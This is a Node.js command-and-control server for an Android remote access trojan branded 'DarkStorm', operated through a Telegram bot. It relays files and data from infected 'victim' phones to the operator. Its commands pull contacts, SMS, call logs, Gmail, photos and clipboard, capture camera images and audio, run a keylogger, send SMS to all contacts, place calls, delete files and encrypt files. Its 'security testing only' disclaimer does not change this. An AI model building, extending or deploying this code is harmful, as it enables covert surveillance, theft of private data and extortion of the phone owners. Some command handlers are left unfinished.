const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer({ storage: multer.memoryStorage() });

// Load configuration from environment variables (Replit) or data.json
let config;
try {
  // Try to get from environment variables first (for Replit)
  config = {
    token: process.env.BOT_TOKEN,
    id: process.env.CHAT_ID
  };

  // If environment variables are not set, try data.json
  if (!config.token || !config.id) {
    const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
    config = {
      token: data.token,
      id: data.id
    };
  }
} catch (e) {
  console.error("Error loading config:", e.message);
  process.exit(1);
}

const bot = new telegramBot(config.token, { polling: true });
const appData = new Map();

// Actions list with improved emojis and English translations
const actions = [
  "📋 Pull Contacts 📋", "📩 Pull Messages 📩", "📞 Call Logs 📞", 
  "📱 Installed Apps 📱", "📷 Rear Camera 📷", "🤳 Front Camera 🤳", 
  "🎙 Record Audio 🎙", "📋 Clipboard History 📋", "🖥 Screenshot 🖥", 
  "💬 Show Toast Message 💬", "✉️ Send SMS ✉️", "📳 Vibrate 📳", 
  "🔊 Play Audio 🔊", "🔇 Stop Audio 🔇", "🔔 Show Notifications 🔔", 
  "🔕 Stop Notifications 🔕", "📂 Browse Files 📂", "🖼 Pull All Photos 🖼", 
  "📤 Send SMS to All Contacts 📤", "⚠️ Fake Notification ⚠️", 
  "📧 Pull Gmail Messages 📧", "🔒 Encrypt Files 🔒", 
  "📞 Call from Victim's Phone 📞", "🔙 Back to Main Menu 🔙"
];

app.get('/', (_req, res) => {
  res.send("Deployed by ᎠᎯᎡᏦ.ᏚᎿᏫᎡᎷ™ | Managed by ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ");
});

// Fixed file upload handler
app.post("/upload", upload.single("file"), (req, res) => {
  try {
    if (!req.file) {
      console.error("No file received in upload request");
      return res.status(400).send("No file uploaded");
    }

    const fileName = req.file.originalname;
    const model = req.headers.model || "Unknown";
    let fileBuffer = req.file.buffer;

    console.log(`Received file: ${fileName} from ${model}`);

    // Process text files
    if (fileName.toLowerCase().endsWith('.txt')) {
      let fileContent = fileBuffer.toString('utf8');
      fileContent = fileContent.replace(/@VIP_J5/g, '@JAKEL69');
      fileBuffer = Buffer.from(fileContent, 'utf8');
    }

    // Send file to Telegram
    bot.sendDocument(config.id, fileBuffer, {
      caption: `<b>🔰 File uploaded from victim → ${model}</b>\n\n` +
               `<b>📁 File Name:</b> ${fileName}\n` +
               `<b>📦 File Size:</b> ${(fileBuffer.length / 1024).toFixed(2)} KB`,
      parse_mode: "HTML"
    }, {
      filename: fileName,
      contentType: req.file.mimetype || "*/*"
    }).then(() => {
      res.send("File uploaded successfully");
    }).catch(error => {
      console.error("Error sending file to Telegram:", error);
      res.status(500).send("Failed to send file to Telegram");
    });

  } catch (error) {
    console.error("Error handling file upload:", error);
    res.status(500).send("Internal server error");
  }
});

io.on("connection", socket => {
  const model = socket.handshake.headers.model + '-' + (io.sockets.sockets.size || "N/A");
  const version = socket.handshake.headers.version || "N/A";
  const ip = socket.handshake.headers.ip || "N/A";
  
  socket.model = model;
  socket.version = version;
  socket.ip = ip;
  
  const connectionMsg = 
    `<b>🟢 Device Connected</b>\n\n` +
    `<b>📱 Device:</b> ${model}\n` +
    `<b>🔄 OS Version:</b> ${version}\n` +
    `<b>🌐 IP:</b> ${ip}\n` +
    `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
    
  bot.sendMessage(config.id, connectionMsg, { parse_mode: "HTML" }).catch(console.error);
  
  socket.on("disconnect", () => {
    const disconnectionMsg = 
      `<b>🔴 Device Disconnected</b>\n\n` +
      `<b>📱 Device:</b> ${model}\n` +
      `<b>🔄 OS Version:</b> ${version}\n` +
      `<b>🌐 IP:</b> ${ip}\n` +
      `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
      
    bot.sendMessage(config.id, disconnectionMsg, { parse_mode: "HTML" }).catch(console.error);
  });
  
  socket.on("file-explorer", files => {
    const keyboard = [];
    let currentRow = [];
    
    files.forEach((file, index) => {
      const callbackData = file.isFolder 
        ? `${model}|cd-${file.name}`
        : `${model}|request-${file.name}`;
      
      const emoji = file.isFolder ? "📁" : file.name.match(/\.(jpg|jpeg|png|gif)$/i) ? "🖼️" : "📄";
      
      currentRow.push({
        text: `${emoji} ${file.name}`,
        callback_data: callbackData
      });
      
      if (currentRow.length === 2 || index === files.length - 1) {
        keyboard.push(currentRow);
        currentRow = [];
      }
    });
    
    keyboard.push([{
      text: "↩️ Back",
      callback_data: `${model}|back-0`
    }, {
      text: "🔄 Refresh",
      callback_data: `${model}|refresh-0`
    }]);
    
    bot.sendMessage(config.id, `<b>📂 Browsing files on ${model}</b>`, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML"
    }).catch(console.error);
  });
  
  socket.on("message", msg => {
    const modifiedMsg = msg.replace(/@VIP_J5/g, '@JAKEL69');
    bot.sendMessage(config.id, 
      `<b>✉️ New message from ${model}</b>\n\n${modifiedMsg}`, 
      { parse_mode: "HTML" }
    ).catch(console.error);
  });
});

bot.on("message", msg => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === "/start") {
    bot.sendMessage(chatId, 
      `<b>🛡️ DarkStorm Security Tool</b>\n\n` +
      `This tool is designed for security testing purposes only.\n` +
      `Developer: ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ\n` +
      `Channel: https://t.me/JAKEL69/\n\n` +
      `<i>⚠️ Use responsibly and legally</i>`, 
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      }
    ).catch(console.error);
  } else {
    // Handle microphone recording
    if (appData.get("currentAction") === "microphoneDuration") {
      const duration = parseInt(text);
      const target = appData.get("currentTarget");
      
      // التصحيح: كان هناك خطأ مطبعي في القوس - تم إصلاحه
      if (isNaN(duration)) {
        bot.sendMessage(chatId, "<b>❌ Invalid duration. Please enter a number.</b>", { parse_mode: "HTML" }).catch(console.error);
        return;
      }
      
      io.to(target).emit("commend", {
        request: "microphone",
        extras: [{ key: "duration", value: duration }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
      bot.sendMessage(chatId, `<b>🔴 Recording started for ${duration} seconds...</b>`, {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      }).catch(console.error);
    } 
    
    // Handle other actions...
    
    // Device count
    else if (text === "📊 Device Count") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(chatId, "<b>❌ No connected devices</b>", { parse_mode: "HTML" }).catch(console.error);
      } else {
        let response = `<b>📊 Connected Devices: ${io.sockets.sockets.size}</b>\n\n`;
        let count = 1;
        
        io.sockets.sockets.forEach(socket => {
          response += 
            `<b>Device #${count}</b>\n` +
            `<b>📱 Name:</b> ${socket.model}\n` +
            `<b>🔄 Version:</b> ${socket.version}\n` +
            `<b>🌐 IP:</b> ${socket.ip}\n` +
            `<b>⏱️ Uptime:</b> ${Math.floor((Date.now() - socket.handshake.time) / 60000)} minutes\n\n`;
          count++;
        });
        
        bot.sendMessage(chatId, response, { parse_mode: "HTML" }).catch(console.error);
      }
    } 
    
    // Control panel
    else if (text === "🎮 Control Panel") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(chatId, "<b>❌ No connected devices</b>", { parse_mode: "HTML" }).catch(console.error);
      } else {
        const keyboard = [];
        io.sockets.sockets.forEach((socket, id) => {
          keyboard.push([socket.model]);
        });
        keyboard.push(["🔙 Back to Main Menu"]);
        
        bot.sendMessage(chatId, "<b>🎮 Select device to control:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: keyboard,
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
    } 
    
    // Developer info
    else if (text === "👨‍💻 Developer Info") {
      bot.sendMessage(chatId, 
        "<b>👨‍💻 Developer Information</b>\n\n" +
        "Name: ᎫᏞ☆ᎻᏦ~|ᏰᏫᎿ|\n" +
        "Telegram: @JAKEL69\n" +
        "Channel: https://t.me/JAKEL69/\n\n" +
        "<i>🔐 Security solutions provider</i>", 
        { parse_mode: "HTML" }
      ).catch(console.error);
    } 
    
    // Back to main menu
    else if (text === "🔙 Back to Main Menu") {
      appData.delete("currentTarget");
      bot.sendMessage(chatId, "<b>🏠 Main Menu</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      }).catch(console.error);
    } 
    
    // Actions for specific device
    else if (actions.includes(text)) {
      const target = appData.get("currentTarget");
      
      if (!target) {
        bot.sendMessage(chatId, "<b>❌ No device selected. Please select a device first.</b>", { 
          parse_mode: "HTML" 
        }).catch(console.error);
        return;
      }
      
      // Handle contact pulling
      if (text === "📋 Pull Contacts 📋") {
        io.to(target).emit("commend", { request: "contacts", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Pulling contacts from device...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle message pulling
      else if (text === "📩 Pull Messages 📩") {
        io.to(target).emit("commend", { request: "all-sms", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Pulling messages from device...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle call logs
      else if (text === "📞 Call Logs 📞") {
        io.to(target).emit("commend", { request: "calls", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Pulling call logs from device...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle installed apps
      else if (text === "📱 Installed Apps 📱") {
        io.to(target).emit("commend", { request: "apps", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Pulling installed apps list...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle rear camera
      else if (text === "📷 Rear Camera 📷") {
        io.to(target).emit("commend", { request: "main-camera", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Capturing rear camera image...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle front camera
      else if (text === "🤳 Front Camera 🤳") {
        io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Capturing front camera image...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle clipboard
      else if (text === "📋 Clipboard History 📋") {
        io.to(target).emit("commend", { request: "clipboard", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Retrieving clipboard history...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle screenshot
      else if (text === "🖥 Screenshot 🖥") {
        io.to(target).emit("commend", { request: "screenshot", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Capturing device screenshot...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Handle notifications
      else if (text === "🔔 Show Notifications 🔔") {
        io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Starting notifications monitoring...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Stop notifications
      else if (text === "🔕 Stop Notifications 🔕") {
        io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
        bot.sendMessage(chatId, "<b>⏹️ Stopping notifications monitoring...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Browse files
      else if (text === "📂 Browse Files 📂") {
        io.to(target).emit("file-explorer", { request: 'ls', extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Loading device file system...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Pull all photos
      else if (text === "🖼 Pull All Photos 🖼") {
        io.to(target).emit("commend", { request: "gallery", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Pulling all photos from device...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Pull Gmail messages
      else if (text === "📧 Pull Gmail Messages 📧") {
        io.to(target).emit("commend", { request: "all-email", extras: [] });
        bot.sendMessage(chatId, "<b>🔃 Pulling Gmail messages from device...</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
      
      // Show toast message
      else if (text === "💬 Show Toast Message 💬") {
        appData.set("currentAction", "toastText");
        bot.sendMessage(chatId, "<b>💬 Enter the message to display:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Send SMS
      else if (text === "✉️ Send SMS ✉️") {
        appData.set("currentAction", "smsNumber");
        bot.sendMessage(chatId, "<b>📱 Enter phone number (with country code):</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Vibrate device
      else if (text === "📳 Vibrate 📳") {
        appData.set("currentAction", "vibrateDuration");
        bot.sendMessage(chatId, "<b>⏱️ Enter vibration duration (seconds):</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Record audio
      else if (text === "🎙 Record Audio 🎙") {
        appData.set("currentAction", "microphoneDuration");
        bot.sendMessage(chatId, "<b>⏱️ Enter recording duration (seconds):</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Send SMS to all contacts
      else if (text === "📤 Send SMS to All Contacts 📤") {
        appData.set("currentAction", "textToAllContacts");
        bot.sendMessage(chatId, "<b>💬 Enter message to send to all contacts:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Fake notification
      else if (text === "⚠️ Fake Notification ⚠️") {
        appData.set("currentAction", "notificationText");
        bot.sendMessage(chatId, "<b>💬 Enter notification text:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Call from victim's phone
      else if (text === "📞 Call from Victim's Phone 📞") {
        appData.set("currentAction", "makeCallNumber");
        bot.sendMessage(chatId, "<b>📱 Enter phone number to call:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Encrypt files
      else if (text === "🔒 Encrypt Files 🔒") {
        appData.set("currentAction", "encryptFiles");
        bot.sendMessage(chatId, "<b>🔑 Enter encryption key:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Play audio
      else if (text === "🔊 Play Audio 🔊") {
        appData.set("currentAction", "playAudio");
        bot.sendMessage(chatId, "<b>🎵 Send audio file to play:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["❌ Cancel Action ❌"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
      
      // Stop audio
      else if (text === "🔇 Stop Audio 🔇") {
        io.to(target).emit("commend", { request: "stopAudio", extras: [] });
        bot.sendMessage(chatId, "<b>⏹️ Audio playback stopped</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
    } 
    
    // Device selection
    else {
      // Find selected device
      let deviceFound = false;
      io.sockets.sockets.forEach((socket, id) => {
        if (text === socket.model) {
          deviceFound = true;
          appData.set("currentTarget", id);
          bot.sendMessage(chatId, `<b>🎮 Controlling: ${socket.model}</b>`, {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [
                ["📋 Pull Contacts 📋", "📩 Pull Messages 📩"],
                ["📞 Call Logs 📞", "📱 Installed Apps 📱"],
                ["📷 Rear Camera 📷", "🤳 Front Camera 🤳"],
                ["🎙 Record Audio 🎙", "📋 Clipboard History 📋"],
                ["🖥 Screenshot 🖥", "💬 Show Toast Message 💬"],
                ["✉️ Send SMS ✉️", "📳 Vibrate 📳"],
                ["🔊 Play Audio 🔊", "🔇 Stop Audio 🔇"],
                ["🔔 Show Notifications 🔔", "🔕 Stop Notifications 🔕"],
                ["📂 Browse Files 📂", "🖼 Pull All Photos 🖼"],
                ["📤 Send SMS to All Contacts 📤"],
                ["⚠️ Fake Notification ⚠️", "📧 Pull Gmail Messages 📧"],
                ["🔒 Encrypt Files 🔒", "📞 Call from Victim's Phone 📞"],
                ["🔙 Back to Main Menu"]
              ],
              resize_keyboard: true,
              one_time_keyboard: true
            }
          }).catch(console.error);
        }
      });
      
      if (!deviceFound) {
        bot.sendMessage(chatId, "<b>❌ Device not found or disconnected</b>", {
          parse_mode: "HTML"
        }).catch(console.error);
      }
    }
  }
});

bot.on("callback_query", query => {
  const data = query.data;
  const [model, actionData] = data.split('|');
  const [actionType, actionValue] = actionData.split('-');

  if (actionType === "back") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", { request: "back", extras: [] });
      }
    });
  } 
  
  else if (actionType === 'cd') {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: 'cd',
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
  } 
  
  else if (actionType === "request") {
    bot.editMessageText(`🔧 Select action for: ${actionValue}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {
        inline_keyboard: [[
          { text: "⬇️ Download", callback_data: `${model}|upload-${actionValue}` },
          { text: "🗑️ Delete", callback_data: `${model}|delete-${actionValue}` }
        ]]
      },
      parse_mode: "HTML"
    }).catch(console.error);
  }
  
  else if (actionType === "upload") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "upload",
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
    
    bot.answerCallbackQuery(query.id, { text: "Download request sent to device" }).catch(console.error);
  }
  
  else if (actionType === "delete") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "delete",
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
    
    bot.answerCallbackQuery(query.id, { text: "Delete request sent to device" }).catch(console.error);
  }
  
  else if (actionType === "refresh") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "refresh",
          extras: []
        });
      }
    });
    
    bot.answerCallbackQuery(query.id, { text: "Refreshing file list..." }).catch(console.error);
  }
});

bot.on("voice", msg => {
  if (appData.get("currentAction") === "playAudio") {
    const fileId = msg.voice.file_id;
    const target = appData.get("currentTarget");
    
    bot.getFileLink(fileId).then(fileLink => {
      io.to(target).emit("commend", {
        request: "playAudio",
        extras: [{ key: "url", value: fileLink }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
      bot.sendMessage(msg.chat.id, "<b>🔊 Playing audio on victim's device...</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      }).catch(console.error);
    }).catch(console.error);
  }
});

setInterval(() => {
  io.sockets.sockets.forEach(socket => {
    socket.emit("ping", {});
  });
}, 5000);

server.listen(process.env.PORT || 3000, () => {
  console.log("🟢 Server running on port 3000");
});
